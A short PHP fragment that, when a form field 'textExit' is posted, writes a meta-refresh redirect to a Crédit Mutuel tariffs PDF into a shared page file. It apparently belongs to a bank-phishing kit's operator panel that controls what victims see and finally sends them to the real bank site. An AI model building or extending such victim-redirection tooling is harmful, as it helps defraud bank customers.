
<?php


session_start();

if(isset($_POST['textExit'])) 
{
    
$Page .= '    <meta http-equiv="refresh" content="0;url=https://www.creditmutuel.fr/partage/fr/CC/CMNE-2018/telechargements/tarifs/2022/particuliers.pdf" />
  ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);




}

else {




}

?>
